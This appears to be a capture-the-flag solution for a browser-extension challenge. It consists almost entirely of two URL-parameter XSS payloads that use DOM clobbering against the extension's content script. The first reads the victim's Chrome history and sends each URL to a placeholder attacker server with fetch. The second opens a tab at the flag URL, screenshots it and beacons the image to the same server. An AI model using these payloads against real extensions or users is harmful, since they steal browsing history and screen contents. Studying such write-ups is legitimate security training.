## Leak the flag's random path using chrome history api and DOM clobbering affecting the content script of the extension to achieve XSS in the context of the extension :
```?message=<form%20id=users>%20<img%20name=privileged%20data-admin=chrome.history.search({text:``,maxResults:10},function(data){data.forEach(function(page){fetch(`http://YOURSERVER?a=`%2Bpage.url);});});></form>```

# Leak the flag by opening a tab with the leaked flag URL and taking a screenshot of the current active tab

```?message=<form%20id=users>%20<img%20name=privileged%20data-admin=chrome.tabs.create({url:`http://challenge:8080/MIc5MDpXQlWj0ak1HnJ7r3iQg1vtOv`},function(tab){setTimeout(function(){chrome.tabs.captureVisibleTab(null,{},function(dataUri){navigator.sendBeacon(`http://YOURSERVER`,dataUri);})},1000);});></form>```